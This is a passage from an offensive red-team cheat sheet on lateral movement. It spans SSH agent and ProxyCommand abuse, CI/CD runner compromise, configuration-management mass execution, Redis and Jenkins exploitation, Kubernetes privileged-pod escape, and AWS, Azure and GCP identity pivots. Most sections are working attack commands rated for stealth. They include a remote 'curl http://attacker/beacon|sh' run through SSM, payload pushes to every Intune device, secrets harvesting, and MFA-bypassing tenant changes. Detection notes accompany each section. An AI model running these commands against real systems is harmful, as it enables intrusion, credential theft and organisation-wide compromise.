# ═══════════════════════════════════════════════════════════
# SSH AGENT FORWARDING ABUSE (T1563.001)
# ═══════════════════════════════════════════════════════════
# If a user has SSH agent forwarding enabled (-A flag or config):
# Their SSH agent socket is available on the remote host
# Find agent sockets:
find /tmp -name "agent.*" -type s 2>/dev/null
ls -la /tmp/ssh-*/
# Hijack the agent (requires access to same user or root):
export SSH_AUTH_SOCK=/tmp/ssh-XXXXabc123/agent.12345
ssh-add -l                                     # List keys in hijacked agent
ssh user@next_target                           # Connect using victim's keys
#
# DETECTION: SSH connections from hosts that shouldn't be SSH clients
# OPSEC RATING: HIGH stealth — uses victim's existing keys, no new credentials

# ═══════════════════════════════════════════════════════════
# SSH PROXYCOMMAND ABUSE (~/.ssh/config write)
# ═══════════════════════════════════════════════════════════
# If attacker can write to a user's ~/.ssh/config, lateral movement
# is triggered when the user themselves runs ssh — passive escalation
# vector.
#
# In ~/.ssh/config, ProxyCommand directive runs an arbitrary command:
#   Host *.internal
#       ProxyCommand bash -c '/tmp/.payload & nc %h %p'
# When the user runs `ssh server.internal`, the payload executes
# under their account context with their existing tools/credentials,
# THEN the SSH connection completes normally — user notices nothing.
#
# Variants:
# - LocalCommand: runs after authentication (under user context)
# - ProxyCommand: runs to establish connection (broadest abuse)
# - Match exec rules: trigger commands based on host/user matching
#
# DETECTION: File integrity monitoring on ~/.ssh/config; auditd watch
#   on this path. Defenders should hash known-good configs and alert
#   on changes. Mature dev workstation hardening watches this file.
# OPSEC RATING: HIGH — passive trigger, runs under legitimate user
#   activity, requires user-initiated SSH session to fire. Caveat:
#   if config syntax is invalid, the user gets a visible SSH error.

# ═══════════════════════════════════════════════════════════
# CI/CD LATERAL PIVOT
# ═══════════════════════════════════════════════════════════
# Jenkins, GitLab Runner, GitHub Actions self-hosted runners, TeamCity
# build agents, AWX/Tower, Concourse — all run as service accounts on
# build infrastructure. Compromise of a CI/CD control node enables:
#
# 1. Pull deployment SSH keys / Kubernetes service account tokens from
#    the runner's credential store. Most CI/CD systems store deployment
#    credentials as encrypted-at-rest secrets accessible to the runner
#    at job-execution time. With code execution as the runner, these
#    credentials are extractable.
# 2. Modify pipeline definitions (Jenkinsfile, .gitlab-ci.yml, GitHub
#    Actions workflow YAML) to inject lateral-movement commands into
#    legitimate deployment jobs. When developers trigger their next
#    build, the attacker code runs in the deployment context with full
#    deploy credentials.
# 3. Read repository SSH deploy keys, allowing pull/push to private
#    repos and downstream development infrastructure access.
# 4. Install backdoor in build artifact (cross-references Persistence
#    Section 13 — Container Image Backdoor / Software Supply Chain
#    Persistence). Deployed artifacts run on production hosts — fan-out
#    lateral movement.
#
# CANONICAL RECENT EXAMPLE: LinkPro / Synacktiv October 2025 intrusion
# chain — Jenkins compromise via CVE-2024-23897 (arbitrary file read) →
# read SSH deploy keys + AWS credentials from Jenkins workspace → SSH
# to AWS EC2 hosts running Kubernetes workers → deploy malicious Docker
# image containing eBPF rootkit → persistent foothold across the entire
# Kubernetes cluster.
#
# ★ GITHUB ACTIONS SELF-HOSTED RUNNER LATERAL (CVE-2025-30066 cluster) ★
# Self-hosted GitHub Actions runners are persistent worker daemons that
# pull workflow jobs from GitHub. Compromise of a self-hosted runner =
# arbitrary code execution in the workflow context, with access to:
# - Repository secrets exposed as GITHUB_* env vars
# - Cloud OIDC tokens (AWS/Azure/GCP via WIF) issued at job start
# - Other repos' workflows that target the same runner labels
#
# CVE-2025-30066 (March 14, 2025) — tj-actions/changed-files action
# was compromised; malicious version published; 23,000+ repos affected.
# Operator pattern then was: any workflow that pinned tj-actions/
# changed-files@<tag> resolved to the malicious release → secrets
# extracted from running workflow → cross-org lateral via stolen tokens.
# Source: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066
#
# Operator post-foothold pattern on a self-hosted runner:
# 1. Locate runner config:
ls /home/runner/_runner/_diag/                      # job logs
ls /home/runner/_runner/_work/                       # checked-out repos
cat /home/runner/_runner/.runner                     # runner identity
cat /home/runner/_runner/.credentials_rsaparams      # signing key
# 2. Wait for next workflow job → harvest secrets from env at exec time
# 3. Modify a queued workflow's checked-out source (in _work/) before
#    workflow execution → inject lateral payload into deployment chain
# 4. Persist by registering a SECOND runner under attacker's identity
#    if you have repo admin token

# ★ ATLASSIAN ECOSYSTEM LATERAL (Confluence / Jira / Bamboo / Bitbucket) ★
# CVE-2023-22527 (Confluence Data Center OGNL injection, January 2024)
# — pre-auth template injection → RCE as Confluence service account.
# Confluence service account often has access to:
# - LDAP bind credentials (configured for SSO)
# - Database credentials (Confluence DB often holds privileged data
#   including API tokens stored as page attachments)
# - Bamboo / Bitbucket cross-application credentials if linked
#
# Bamboo + Bitbucket compromise = CI/CD-equivalent lateral pivot
# (deployment SSH keys, Docker registry creds, Kubernetes kubeconfigs).
#
# CVE-2024-21683 (Confluence DC RCE, May 2024) — authenticated RCE for
# operator already on the network via stolen credentials.
#
# ENUMERATION ON CI/CD HOST:
# Jenkins: ls $JENKINS_HOME/credentials.xml; ls $JENKINS_HOME/secrets/
# GitLab Runner: ls /etc/gitlab-runner/config.toml (token + executor config)
# GitHub Actions self-hosted: ls /home/actions/.runner; ls _diag/_runner_token*
# AWX/Tower: psql awx → SELECT * FROM main_credential
#
# DETECTION: Anomalous outbound connections from CI/CD infrastructure
#   to non-deployment-target endpoints. New pipeline modifications
#   committed by unusual users. Build artifact hash drift between builds.
#   Defenders: include CI/CD nodes in identity-tier hunting (these are
#   often Tier 2 or even Tier 1 by access path despite being labeled
#   "application infrastructure").
# OPSEC RATING: VERY HIGH — CI/CD compromise is rarely modeled as
#   identity attack surface and produces little SIEM telemetry by
#   default. The pattern continues to be under-detected even after
#   multiple high-profile incidents.

# ═══════════════════════════════════════════════════════════
# ANSIBLE / SALTSTACK / PUPPET ABUSE
# ═══════════════════════════════════════════════════════════
# If you compromise a configuration management control node → mass execution:
# Ansible (agentless, uses SSH):
ansible all -i /etc/ansible/hosts -m shell -a "id" --become
ansible all -i /etc/ansible/hosts -m copy -a "src=/tmp/beacon dest=/tmp/beacon mode=0755" --become
ansible all -i /etc/ansible/hosts -m shell -a "/tmp/beacon &" --become
# Or use an ad-hoc playbook for more complex operations
#
# SaltStack (agent-based — salt-minion on each host):
salt '*' cmd.run 'id'
salt '*' cmd.run '/tmp/beacon &'
# Salt has master → minion trust — compromise master = own all minions
#
# Puppet: Modify manifests on Puppet master → agents pull and execute on next run
# Chef: Modify cookbooks/recipes → nodes converge on next run
#
# DETECTION: CM tool execution logs, unusual ad-hoc commands
# OPSEC RATING: HIGH stealth for Ansible — looks like legitimate automation
#   MEDIUM for Salt/Puppet/Chef — execution patterns may differ from normal

# ═══════════════════════════════════════════════════════════
# REMOTE SERVICE EXPLOITATION
# ═══════════════════════════════════════════════════════════
# Redis (unauthenticated access → write to crontab or SSH keys):
# Redis 6.0+ introduced ACLs, but the special 'default' user is configured
# as 'nopass' by default — meaning connections are auto-authenticated unless
# an admin explicitly sets requirepass or reconfigures the default user's ACL.
# In practice: many Redis instances remain accessible without auth even on 6.x+
# if administrators have not explicitly hardened the configuration.
# Check: redis-cli -h 10.0.0.5 PING (if "PONG" → no auth required)
redis-cli -h 10.0.0.5
10.0.0.5:6379> CONFIG SET dir /root/.ssh
10.0.0.5:6379> CONFIG SET dbfilename authorized_keys
10.0.0.5:6379> SET payload "\n\nssh-ed25519 AAAA...key\n\n"
10.0.0.5:6379> SAVE
# Now SSH as root with your key
#
# PostgreSQL (if superuser access → command execution):
# SELECT pg_read_file('/etc/passwd');
# COPY (SELECT '') TO PROGRAM 'id > /tmp/out';
#
# MSSQL (for Windows pivoting via SQL Servers):
# See AD Cheat Sheet Section 9 for: xp_cmdshell, linked server chains,
#   impersonation, NTLM capture via xp_dirtree, OLE Automation
# MSSQL is often the bridge between network segments in AD environments
#
# Memcached (commonly unauthenticated, port 11211):
# echo "stats" | nc 10.0.0.5 11211      # enumerate
# echo "stats slabs" | nc 10.0.0.5 11211   # check for stored data
# Memcached is rarely an RCE primitive but can yield session tokens,
# cached credentials, app-internal API keys.
#
# Elasticsearch / Kibana (default unauth on internal deploys):
# curl http://10.0.0.5:9200/_cluster/health  # confirm
# curl http://10.0.0.5:9200/_search?pretty   # data dump
# Kibana < 7.7 vulnerable to script-tag prototype pollution → RCE
# Kibana >= 8.x: scripted dashboards, console plugin if enabled
# Recent CVEs: CVE-2024-37287 (Elasticsearch privilege escalation)
#
# Hadoop YARN ResourceManager (port 8088):
# Unauthenticated job submission → command execution as YARN service:
# curl -X POST -d '{"application-id":"...","unmanaged-AM":true,...}' \
#   http://10.0.0.5:8088/ws/v1/cluster/apps
# Documented APT use (Pacha, Outlaw, Kinsing crypto-miners) — common
# in big data deployments where defenders treat YARN as "data
# infrastructure" not identity infrastructure.
#
# Jenkins (target itself, separate from CI/CD lateral pivot above):
# Unauthenticated /script endpoint when matrix auth misconfigured:
# curl -d "script=Runtime.getRuntime().exec('id')" http://10.0.0.5:8080/script
# CVE-2024-23897 (arbitrary file read via CLI) is the canonical 2024-25
# Jenkins compromise CVE — unauthenticated read of any file the Jenkins
# user can read (typically including stored credentials).
#
# DETECTION: Service-specific logs, unusual commands
# OPSEC RATING: VARIES — depends on service monitoring

# ═══════════════════════════════════════════════════════════
# SSH KNOWN_HOSTS MANIPULATION (T1564 / T1070)
# ═══════════════════════════════════════════════════════════
# Modifying ~/.ssh/known_hosts on a pivot host serves two purposes:
# 1. Enumerate hosts the user has previously connected to (lateral
#    movement targeting via known-good targets):
ssh-keygen -l -f ~/.ssh/known_hosts    # show host fingerprints + names
# Most modern SSH configs use HashKnownHosts which obscures hostnames;
# but the operator can:
#   - read recent shell history for ssh commands
#   - check ~/.ssh/config for explicit Host blocks
#   - watch ~/.bash_history, ~/.zsh_history for ssh invocations
# 2. Suppress fingerprint warnings on attacker's lateral moves —
#    pre-populate known_hosts so subsequent ssh from this user bypasses
#    "host key verification" prompts that would otherwise alert them
#    to MITM activity.
#
# OPSEC RATING: HIGH — purely passive enumeration of past lateral
#   patterns; no network activity required.

# ═══════════════════════════════════════════════════════════
# KUBERNETES LATERAL MOVEMENT (T1610 + T1611)
# Pod-to-pod and pod-to-host pivoting in K8s clusters
# ═══════════════════════════════════════════════════════════
# Once attacker has shell in a pod (via container escape, app RCE,
# stolen kubeconfig, or compromised CI/CD as in chains callout):
#
# 1. ENUMERATE FROM INSIDE POD:
# Service account token (always mounted unless explicitly disabled):
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Cluster API endpoint:
echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
# Probe API permissions with the SA token:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://$KUBERNETES_SERVICE_HOST/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{"spec":{"resourceAttributes":{"verb":"*","resource":"*"}}}'
#
# 2. POD-TO-POD VIA KUBECTL EXEC (if SA has pod/exec rights):
# Install kubectl in the pod or use raw API:
TOKEN=...
kubectl --token=$TOKEN exec -it -n target-ns pod-name -- /bin/bash
# Or via curl directly to the API exec endpoint:
curl -k -H "Authorization: Bearer $TOKEN" \
  "https://$APISERVER/api/v1/namespaces/ns/pods/podname/exec?command=sh&stdin=true&stdout=true&tty=true" \
  --upgrade-insecure-requests
#
# 3. PRIVILEGED POD CREATION (if SA has pod create rights):
# Create a pod that mounts host filesystem, runs as root:
cat <<EOF | kubectl --token=$TOKEN apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: maintenance
  namespace: target-ns
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: tool
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostroot
      mountPath: /host
  volumes:
  - name: hostroot
    hostPath:
      path: /
  nodeSelector:
    kubernetes.io/hostname: target-node    # pin to specific node
EOF
# kubectl exec into this pod → chroot /host → host-level shell as root
#
# 4. SECRETS HARVESTING:
kubectl --token=$TOKEN get secrets --all-namespaces -o yaml
# Secrets are base64-encoded by default (NOT encrypted at rest unless
# explicit encryption config). Common high-value targets:
# - Cloud provider IAM credentials (aws-credentials, gcp-sa-key)
# - Database connection strings
# - Service account tokens for higher-privilege SAs
# - TLS certificates for downstream MITM
#
# 5. NODE-LEVEL ESCAPE FROM PRIVILEGED POD:
# With privileged: true container access to host:
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
# Or via /proc/1/root (chroot):
chroot /host /bin/sh
# Now operating as root on the K8s node host — pivot to other pods
# scheduled on this node, harvest other SA tokens from local Docker
# socket / containerd socket.
#
# 6. CROSS-CLUSTER VIA SERVICE-MESH OR FEDERATED IDENTITY:
# If cluster uses Workload Identity Federation (GCP/AWS/Azure), the
# SA token can be exchanged for cloud IAM credentials, providing
# cross-cluster lateral via the cloud control plane (see Section 9).
#
# CANONICAL EXAMPLE: LinkPro / Synacktiv October 2025 — CI/CD pivot
# (Jenkins compromise) → docker image with eBPF rootkit → deploy to
# EKS cluster → pod-to-pod → privileged pod → node escape → cluster-
# wide foothold. Reference: Synacktiv blog "LinkPro: an eBPF rootkit
# in the wild" (October 2025).
#
# 7. INGRESSNIGHTMARE LATERAL (CVE-2025-1097/-1098/-24513/-24514) ★
# Ingress NGINX controller admission webhook RCE (Wiz Research, March
# 2025). Pre-auth RCE on the ingress controller pod → controller has
# cluster-wide secret read by default → operator obtains every Secret
# in every namespace → instant lateral to all pods + all SAs.
# - CVE-2025-1097, CVE-2025-1098, CVE-2025-24513, CVE-2025-24514
# - Source: https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
# - Patched in ingress-nginx 1.11.5 / 1.12.1 (March 2025)
# Operator path:
# - From any pod (or external if ingress is internet-exposed):
curl -k https://INGRESS-NGINX-WEBHOOK:8443/ \
  -H "Content-Type: application/json" \
  -d @evil-admission-review.json
# Returns SYSTEM-equivalent on ingress controller pod → kubectl as
# ingress-nginx SA → cluster-wide Secret read.
#
# DETECTION: K8s API audit logs (verbs: create/exec on pods, get on
#   secrets); Falco rules for shell-in-container, sensitive mount
#   inside container, anomalous SA token usage from non-cluster IPs.
#   Cilium / Tetragon eBPF-based runtime detection.
# OPSEC RATING: VERY HIGH against environments without K8s-aware
#   monitoring (the majority); MEDIUM-LOW against CNCF-recommended
#   stack with audit logs + Falco/Tetragon.
```

---

## 9 — CLOUD LATERAL MOVEMENT

```bash
# ════════════════════════════════════════════════════════════
# AWS
# ════════════════════════════════════════════════════════════
# --- Cross-Account Role Assumption ---
# If trust policy allows your compromised identity:
aws sts assume-role --role-arn arn:aws:iam::TARGET_ACCT:role/CrossAccountRole --role-session-name lateral
# Use returned temporary credentials to access target account resources

# --- SSM (Systems Manager) Command Execution ---
# If current identity has ssm:SendCommand on managed EC2 instances:
aws ssm send-command --instance-ids i-xxx --document-name "AWS-RunShellScript" \
  --parameters commands=["curl http://attacker/beacon|sh"] --region us-east-1
# Executes as root/SYSTEM on managed instances

# --- EC2 Instance Connect ---
# Push temporary SSH key to EC2 instance (requires ec2-instance-connect:SendSSHPublicKey):
aws ec2-instance-connect send-ssh-public-key --instance-id i-xxx \
  --instance-os-user ec2-user --ssh-public-key file://~/.ssh/id_ed25519.pub
ssh ec2-user@<INSTANCE_IP>    # Key valid for 60 seconds

# --- Lambda → Other Services ---
# Invoke Lambda function that has different IAM permissions:
aws lambda invoke --function-name admin-function /tmp/out.json
# Lambda may have access to services your current role doesn't

# --- Lambda Layer Poisoning ---
# Lambda Layers are reusable code packages (zip archives) that multiple
# functions can attach. Poison a layer used by a privileged function:
# 1. Identify functions sharing a layer:
aws lambda list-functions --query 'Functions[*].[FunctionName,Layers]'
# 2. Publish a malicious version of a layer the operator can update:
aws lambda publish-layer-version --layer-name shared-utils \
    --content S3Bucket=bucket,S3Key=evil-layer.zip
# 3. Update target function to use new layer version:
aws lambda update-function-configuration --function-name privileged-fn \
    --layers arn:aws:lambda:us-east-1:111:layer:shared-utils:99
# Next invocation of privileged-fn loads the poisoned layer → arbitrary
# code execution in that function's IAM role context.

# --- CloudFormation StackSet Cross-Account Abuse ---
# StackSets allow deployment of resources across MULTIPLE AWS accounts
# in an Organization. If attacker has cloudformation:CreateStackSet in
# the Organization management account (or in a delegated administrator):
aws cloudformation create-stack-set --stack-set-name evil \
    --template-body file://lateral.yaml \
    --capabilities CAPABILITY_NAMED_IAM \
    --permission-model SERVICE_MANAGED \
    --auto-deployment Enabled=true,RetainStacksOnAccountRemoval=false
aws cloudformation create-stack-instances --stack-set-name evil \
    --deployment-targets OrganizationalUnitIds=ou-target-id \
    --regions us-east-1 us-west-2
# The template runs in EVERY account in the target OU as the
# AWSCloudFormationStackSetExecutionRole — typically AdministratorAccess
# in member accounts. Single API call → cross-account RCE at org scale.

# --- STS GetFederationToken / GetSessionToken ---
# Beyond AssumeRole — alternate credential generation paths:
# GetFederationToken: produces credentials for a "federated user" with
#   permissions = intersection(caller's permissions, supplied policy).
#   Useful when caller has broad access but operator wants minimum-noise
#   credentials with very specific scope (e.g., S3-only for staging
#   exfil) that don't trigger the same CloudTrail alerts as broader
#   AssumeRole calls:
aws sts get-federation-token --name lateral-session \
    --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"s3:*","Resource":"*"}]}'
# GetSessionToken: produces temporary creds tied to caller's MFA. Used
#   for MFA-required actions when operator has the long-lived AKID/SAK
#   plus MFA token.
#
# Both methods produce credentials that look slightly different in
# CloudTrail vs AssumeRole — useful for evading alerts that hunt
# specifically on AssumeRole patterns.

# --- AWS IAM Identity Center session theft (cross-account fan-out) ---
# IAM Identity Center (formerly AWS SSO) — single token grants access to
# ALL accounts the user is assigned to. Theft paths:
# - Browser session cookie theft from compromised workstation (via
#   infostealer or DPAPI extraction)
# - AiTM phishing on the IAM Identity Center login portal
# - ~/.aws/sso/cache/*.json on victim's workstation (refresh tokens
#   for active SSO session, valid up to 90 days depending on portal config)
# Once obtained:
aws sso list-account-roles --access-token <STOLEN> --account-id <ACCT>
aws sso get-role-credentials --role-name <ROLE> \
  --account-id <ACCT> --access-token <STOLEN>
# Yields temporary credentials per account-role pair → operator now has
# parallel access to every assigned AWS account WITHOUT re-auth, MFA,
# or Conditional Access enforcement at the token-redemption step.
# Documented APT operationalization: Storm-0501 (MS Threat Intel Aug 2025).

# --- EKS Pod Identity (alternative to IRSA, re:Invent 2023) ---
# EKS Pod Identity is the post-2023 successor to IRSA (IAM Roles for
# Service Accounts). Mechanism: EKS Pod Identity Agent runs as DaemonSet,
# proxies credential requests from pods to STS using a pod-level identity
# binding rather than per-SA OIDC trust.
# Operator-relevant differences from IRSA:
# - Credentials served at IMDS-equivalent endpoint (169.254.170.23) rather
#   than via OIDC token exchange — different audit footprint
# - Pod Identity Association (PIA) is the new abuse target — write access
#   to PIAs in a cluster = arbitrary IAM role attachment to attacker pod
aws eks list-pod-identity-associations --cluster-name <cluster>
aws eks create-pod-identity-association --cluster-name <cluster> \
  --namespace <ns> --service-account <sa> --role-arn <high-priv-role>
# Then deploy attacker pod using that SA → credentials for high-priv
# role available at 169.254.170.23.

# DETECTION: CloudTrail (AssumeRole, SendCommand, SendSSHPublicKey,
#   Invoke, PublishLayerVersion, UpdateFunctionConfiguration,
#   CreateStackSet, GetFederationToken, GetSessionToken,
#   CreatePodIdentityAssociation, sso:GetRoleCredentials with anomalous
#   source IP).
#   GuardDuty UnauthorizedAccess findings on anomalous IP for credential
#   use. Detective for credential lineage tracing across accounts.
#   Identity Center has its own audit log surfacing portal-side actions.

# ════════════════════════════════════════════════════════════
# AZURE / ENTRA ID
# ════════════════════════════════════════════════════════════
# --- Managed Identity Pivoting ---
# If on Azure VM with Managed Identity → request token for different services:
# Token for Azure Resource Manager:
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2019-08-01"
# Token for Microsoft Graph:
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01"
# Token for Azure Key Vault:
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net/&api-version=2019-08-01"
# Each token provides access to different Azure services

# --- Azure Bastion / Serial Console ---
# If Portal access: use Azure Bastion to connect to VMs without public IP
# Serial Console: direct console access to VM even without network

# --- Cross-Subscription Access ---
# If identity has roles in multiple subscriptions:
az account list    # See all subscriptions
az account set --subscription <OTHER_SUB>
az vm list         # Enumerate VMs in other subscription

# --- Refresh Token / PRT Cookie Theft (Hybrid Identity Lateral) ---
# On a compromised Entra-joined or Hybrid-joined Windows host, the user's
# Primary Refresh Token (PRT) and refresh tokens are cached locally:
# - PRT lives in CloudAP cache, encrypted with TPM-backed key on capable
#   hardware
# - WAM (Web Account Manager) tokens cached at:
#     %LOCALAPPDATA%\Packages\Microsoft.AAD.BrokerPlugin_*\AC\TokenBroker
# - Browser cookie cache (Chrome / Edge): SSO cookies for *.microsoft.com,
#   *.office.com, *.onmicrosoft.com — refreshable by attacker browser
#
# ROADtools roadtx (Dirk-jan Mollema):
roadtx prt --action gettokens     # Extract PRT from local cache
roadtx prtenrich --prt <PRT>      # Enrich PRT with attacker keys
roadtx browserprtauth             # Use enriched PRT for browser session
#
# AADInternals (Dr. Nestori Syynimaa):
# Get-AADIntUserPRTToken            # Get user's PRT from local cache
# New-AADIntUserPRTToken            # Forge a new PRT
# Get-AADIntAccessTokenForAzureCoreManagement -PRTToken <token>
#
# Once attacker holds PRT or refresh token: cross-app lateral via single
# sign-on into O365, Salesforce (with Entra IdP), Atlassian Cloud,
# ServiceNow, GitHub Enterprise — anywhere the user's tenant federates.
# Stealth depends on Conditional Access posture: tokens replayed from
# attacker IP frequently flag Identity Protection sign-in risk.

# --- Service Principal / App Registration Lateral ---
# If you compromise an app registration's client secret or certificate:
# - SP can be assigned Azure RBAC roles (Contributor / Owner) on
#   subscriptions or resource groups → resource control plane access
# - SP can have Graph API permissions (Application.ReadWrite.All,
#   Directory.ReadWrite.All, RoleManagement.ReadWrite.Directory) →
#   ability to grant additional permissions, modify other SPs, escalate
# - SP authenticates without MFA, and user-context Conditional Access
#   does not apply (workload identity CA is separate and frequently
#   not deployed) — treat compromised SP creds as instant cross-
#   application keys
# Enumerate SP permissions:
# az ad sp list --filter "appOwnerOrganizationId eq '<TENANT_ID>'"
# Microsoft Graph: GET /servicePrincipals/{id}/appRoleAssignments

# --- OAuth Cross-Tenant Pivot ---
# Register attacker app in your own tenant → configure as multi-tenant →
# trick admin in victim tenant into consenting (see Initial Access
# Section 2.6). Resulting service principal in victim tenant has the
# scopes consented to → cross-tenant lateral.
# Variant: cross-tenant synchronization (Entra B2B sync, GA 2022) abuse
# if attacker controls a federated tenant — pushes identities across
# the trust.

# --- Function App / Logic App / Automation Account Abuse ---
# Azure Function Apps with system-assigned or user-assigned managed
# identity provide cross-service lateral primitives equivalent to AWS
# Lambda → other services. Operator workflow:
# 1. List function apps and their assigned identities:
az functionapp list --query '[].[name,identity]'
# 2. If you can deploy code to a Function App (Contributor on the app,
#    or write to its source repo / Kudu deployment endpoint):
az functionapp deployment source config-zip \
    -g rg -n target-fn --src evil.zip
# 3. The function executes with the managed identity's token — useful
#    for accessing Key Vault, Storage, other ARM resources the original
#    role couldn't reach.
#
# Logic Apps: visual workflow service, but workflows can include arbitrary
# HTTP/code actions running with the workflow's managed identity. Same
# abuse pattern — modify a workflow definition to exfiltrate or pivot.
#
# Automation Account RunAs: Azure Automation Accounts historically had
# RunAs accounts (service principal cert-based). Microsoft deprecated
# RunAs in September 2023 in favor of managed identities, but many
# tenants still have legacy RunAs configurations:
az automation account list
az automation runbook list --automation-account-name acct -g rg
# A modified runbook executing with the RunAs SP's privileges = cross-
# subscription lateral if the RunAs has broad role assignments (common
# legacy pattern).

# --- Cross-Tenant Access Settings (XTAS) abuse — Storm-0501 pattern ---
# Microsoft Threat Intel reporting (August 2025) — Storm-0501 modifies
# cross-tenant access policy (XTAS) to permit B2B from attacker tenant
# WITHOUT MFA / device-compliance requirements → operator's identity
# in attacker tenant authenticates into victim tenant as fully trusted.
# Persistent identity-plane lateral.
# Enumerate current XTAS policies:
Get-MgPolicyCrossTenantAccessPolicyDefault
Get-MgPolicyCrossTenantAccessPolicyPartner
# Modify (requires Global Admin or Cross-Tenant Access Administrator):
Update-MgPolicyCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyConfigurationPartnerTenantId <attacker_tenant> \
  -InboundTrust @{
    isMfaAccepted = $true; isCompliantDeviceAccepted = $true;
    isHybridAzureADJoinedDeviceAccepted = $true
  }
# Result: attacker-tenant identities federated as if they're trusted
# enterprise users — full Conditional Access bypass.

# --- Federated Identity Credential (FIC) abuse for cross-cloud lateral ---
# Cross-ref Privesc cheatsheet §17.2. FIC enables federation between
# attacker-controlled OIDC issuer and a managed identity / app
# registration in victim tenant → operator's external token exchanges
# for victim-tenant Entra access tokens WITHOUT a secret on victim tenant.
# Lateral framing: from one compromised app/MI in victim tenant, write
# a FIC pointing to attacker OIDC issuer → operator can mint that MI's
# tokens at will from anywhere.
az identity federated-credential create --name atk-fic \
  --identity-name <victim-mi> --resource-group <rg> \
  --issuer https://attacker.oidc.example/ --subject system:any
# Maximum 20 FICs per identity — operator can occupy multiple slots
# for redundancy.

# --- Microsoft Intune lateral via stolen admin token (G4) ---
# Intune (Microsoft Endpoint Manager) admin compromise = ability to push
# remediation script (PowerShell, Bash on macOS, shell on Linux) as
# SYSTEM/root to all enrolled devices. Equivalent to RMM compromise but
# via Microsoft-native management.
# Documented: CISA AA24-269A (October 2024) and Microsoft Threat Intel
# 2024-2025 reports on Intune admin compromise lateral patterns.
#
# With Intune Administrator role:
# Microsoft Graph: POST /deviceManagement/deviceShellScripts (macOS/Linux)
#                 POST /deviceManagement/deviceManagementScripts (Windows)
# Or via Intune portal → "Devices → Scripts → Add" → assign to "All Devices".
# Script content runs as SYSTEM (Win) or root (macOS/Linux) on next agent
# checkin (default 60 minutes, can be force-triggered):
Invoke-RestMethod -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts" \
  -Headers @{Authorization="Bearer $TOKEN"} -Method POST -ContentType "application/json" \
  -Body @{
    displayName = "Update Helper"
    scriptContent = "<base64 PS payload>"
    runAsAccount = "system"
    enforceSignatureCheck = $false
    fileName = "update.ps1"
  } | ConvertTo-Json
# Then assign to All Devices via assignment endpoint.
# Operationally devastating — produces no Windows event log entry mapping
# to "remote command execution" detection rules; surfaces only in Intune
# audit logs (admin-side) and Defender for Endpoint script-execution
# telemetry per device (which, if not specifically tuned for Intune
# anomaly, blends with normal config-management activity).

# DETECTION: Azure Activity Log, Entra ID sign-in logs (look for non-
#   interactive sign-ins from new IPs), Microsoft Defender for Cloud Apps
#   raises PRT replay alerts, Defender XDR cross-app correlation,
#   Identity Protection risk signal on token replay from anomalous IP.
#   For Intune: Intune audit log on script creation + assignment;
#   correlate with global-administrator role activations (PIM).
#   For XTAS: Entra audit log "Update cross-tenant access settings".
#   For FIC: Q1 2026 added to MDCA SSPM coverage.

# ════════════════════════════════════════════════════════════
# GCP
# ════════════════════════════════════════════════════════════
# --- Service Account Impersonation Chain ---
# If SA-A can impersonate SA-B, and SA-B has compute access:
gcloud auth activate-service-account --key-file=sa-a-key.json
# Use --impersonate-service-account flag on any gcloud command:
gcloud compute instances list --impersonate-service-account=sa-b@project.iam.gserviceaccount.com
# Or get a token for direct API use:
gcloud auth print-access-token --impersonate-service-account=sa-b@project.iam.gserviceaccount.com

# --- IAP Tunneling (Identity-Aware Proxy) ---
# Access internal VMs through IAP without public IP:
gcloud compute ssh INSTANCE --zone ZONE --tunnel-through-iap

# --- Compute Engine SSH (OS Login) ---
gcloud compute ssh INSTANCE --zone ZONE
# Uses OS Login or metadata-based SSH keys — no password needed

# --- Compute Engine Metadata Token Theft ---
# On a compromised GCE VM, the instance metadata server provides the
# attached service account's token. From inside the VM:
curl -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns the SA token used for cross-service lateral. The SA's scope
# (legacy "scopes" model) plus its IAM role determine what it can do.
# Default Compute Engine SA in older projects has Editor role across the
# project — this is essentially Project Admin.
#
# Token can be used from outside the VM:
TOKEN=$(curl -H "Metadata-Flavor: Google" .../token | jq -r .access_token)
curl -H "Authorization: Bearer $TOKEN" \
    https://compute.googleapis.com/compute/v1/projects/PROJECT/zones/-/instances
# Cross-cloud: token works from anywhere until expiration (~1 hour);
# refresh requires VM re-access or impersonation chain.

# --- Cloud Build Service Account Abuse ---
# Cloud Build runs builds with a default service account that historically
# had Editor role on the project (Google deprecated this for new projects
# in 2024 but legacy projects retain it). Compromise of source repo or
# build trigger config = arbitrary code in the Cloud Build SA context.
gcloud builds list
gcloud builds triggers list
# Modify a trigger's build config:
gcloud builds triggers import --source=evil-trigger.yaml
# Trigger build → build runs as Cloud Build SA → arbitrary code with
# Editor on project (legacy) or with whatever IAM role admins migrated
# the SA to (current).

# --- Workload Identity Federation (WIF) Cross-Cloud ---
# WIF allows external identities (AWS roles, Azure managed identities,
# GitHub Actions OIDC, Kubernetes SAs) to impersonate GCP service
# accounts WITHOUT a long-lived key. From an AWS-side compromise:
# 1. If GCP project has a WIF pool trusting an AWS account:
gcloud iam workload-identity-pools list --location=global
gcloud iam workload-identity-pools providers list \
    --workload-identity-pool=POOL --location=global
# 2. From the trusted AWS context, exchange AWS creds for GCP SA token:
# (See Google's documentation on the STS-style token exchange API)
# 3. Use returned GCP token to access GCP resources.
#
# Same pattern in reverse: AWS → GCP, GCP → AWS, GCP → Azure, etc.
